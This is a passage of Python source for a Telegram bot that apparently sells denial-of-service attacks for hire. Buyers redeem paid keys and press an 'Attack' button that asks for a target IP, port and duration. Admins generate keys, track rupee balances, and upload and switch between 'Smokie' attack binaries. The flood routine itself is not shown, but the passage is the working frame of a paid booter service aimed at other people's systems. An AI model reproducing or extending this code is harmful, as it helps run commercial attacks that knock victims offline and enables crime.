            f"/thread - Set thread count\n"
            f"/setSmokie - Use Smokie (thread) binary\n"
            f"/setSmokie1 - Use Smokie1 (no thread) binary\n"
            f"/checkbinary - Check binary status\n"
            f"/uploadbinary - Upload the binary\n"
            f"/listbinaries - List all the binary status\n"
            
        )
    elif is_admin(user_id):
        balance = get_admin_balance(user_id)
        welcome_message = (
            f"Welcome, Admin! To {_d(Hmm_Smokie)}\n\n"
            f"Your Balance: {balance}\n\n"
            f"Admin Commands:\n"
            f"/genkey - Generate new key\n"
            f"/remove - Remove user\n"
            f"/balance - Check your balance"
        )
    else:
        welcome_message = (
            f"Welcome, {username}! To {_d(Hmm_Smokie)}\n\n"
            f"Please redeem a key to access bot functionalities.\n"
            f"Available Commands:\n"
            f"/redeem - To redeem key\n"
            f"/Attack - Start an attack\n\n"
            f"Contact {_d(Hmm_Smokiee)} for new keys"
        )

    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)



@bot.message_handler(func=lambda message: message.text == "🚀 ᴀᴛᴛᴀᴄᴋ")
def attack_button_handler(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # If user is admin, allow attack without key check
    if is_admin(user_id):
        try:
            bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
            bot.register_next_step_handler(message, process_attack_command, chat_id)
            return
        except Exception as e:
            logging.error(f"Error in attack button: {e}")
            return

    # For regular users, check if they have a valid key
    users = load_users()
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if not found_user:
        bot.send_message(chat_id, "*𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- @Hmm_Smokie*", parse_mode='Markdown')
        return

    valid_until = datetime.fromisoformat(found_user['valid_until'])
    if datetime.now() > valid_until:
        bot.send_message(chat_id, "*𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- @Hmm_Smokie.*", parse_mode='Markdown')
        return

    try:
        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command, chat_id)
    except Exception as e:
        logging.error(f"Error in attack button: {e}")

@bot.message_handler(func=lambda message: message.text == "🔑 ᴍʏ ᴀᴄᴄᴏᴜɴᴛ")
def my_account(message):
    user_id = message.from_user.id
    users = load_users()

    # Find the user in the list
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if is_super_admin(user_id):
            account_info = (
                "👑---------------𝔸𝕕𝕞𝕚𝕟 𝔻𝕒𝕤𝕙𝕓𝕠𝕒𝕣𝕕---------------👑       \n\n"
                "🌟  𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗗𝗲𝘁𝗮𝗶𝗹𝘀               \n"
                "ꜱᴛᴀᴛᴜꜱ: Super Admin\n"
                "ᴀᴄᴄᴇꜱꜱ ʟᴇᴠᴇʟ: Unlimited\n"
                "ᴘʀɪᴠɪʟᴇɢᴇꜱ: Full System Control\n\n"
                "💼  𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻𝘀 \n"
                "• Generate Keys\n"
                "• Manage Admins\n"
                "• System Configuration\n"
                "• Unlimited Balance"
            )
    
    elif is_admin(user_id):
            # For regular admins
            balance = get_admin_balance(user_id)
            account_info = (
                "🛡️---------------𝔸𝕕𝕞𝕚𝕟 ℙ𝕣𝕠𝕗𝕚𝕝𝕖---------------🛡️\n\n"
                f"💰  𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance}₹\n\n"
                "🌐  𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗦𝘁𝗮𝘁𝘂𝘀:\n"
                "• ʀᴏʟᴇ: Admin\n"
                "• ᴀᴄᴄᴇꜱꜱ: Restricted\n"
                "• ᴘʀɪᴠɪʟᴇɢᴇꜱ:\n"
                "  - Generate Keys\n"
                "  - User Management\n"
                "  - Balance Tracking"
            )
    elif found_user:
        valid_until = datetime.fromisoformat(found_user.get('valid_until', 'N/A')).strftime('%Y-%m-%d %H:%M:%S')
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
            account_info = (
                "𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐚 𝐧𝐞𝐰 𝐤𝐞𝐲.\n"
                "Contact @Hmm_Smokie for assistance."
            )
        else:
            account_info = (
                f"𝕐𝕠𝕦𝕣 𝔸𝕔𝕔𝕠𝕦𝕟𝕥 𝕀𝕟𝕗𝕠𝕣𝕞𝕒𝕥𝕚𝕠𝕟:\n\n"
                f"ᴜꜱᴇʀɴᴀᴍᴇ: {found_user.get('username', 'N/A')}\n"
                f"ᴠᴀʟɪᴅ ᴜɴᴛɪʟ: {valid_until}\n"
                f"ᴘʟᴀɴ: {found_user.get('plan', 'N/A')}\n"
                f"ᴄᴜʀʀᴇɴᴛ ᴛɪᴍᴇ: {current_time}"
            )
    else:
        account_info = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- @Hmm_Smokie."

    bot.send_message(message.chat.id, account_info)

def initialize_mongodb():
    """Ensure necessary collections and default data exist"""
    try:
        # Ensure indices for efficient querying
        users_collection.create_index('user_id', unique=True)
        keys_collection.create_index(list(keys_collection.find_one().keys())[0], unique=True)
        
        # Initialize default admin data if not exists
        if not admin_collection.find_one({'type': 'admin_data'}):
            default_admins = {str(admin_id): {'balance': float('inf')} for admin_id in ADMIN_IDS}
            admin_collection.insert_one({
                'type': 'admin_data',
                'admins': default_admins
            })
        
        logger.info("MongoDB initialization complete.")
    except Exception as e:
        logger.error(f"Error during MongoDB initialization: {e}")

if __name__ == '__main__':
    print("Bot is running...")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    # Start the asyncio thread
    Thread(target=start_asyncio_thread).start()
    
    # Start the user expiry check thread
    Thread(target=check_user_expiry).start()

    while True:
        try:
            bot.polling(timeout=60)
        except ApiTelegramException as e:
            time.sleep(5)
        except Exception as e:
            time.sleep(5)
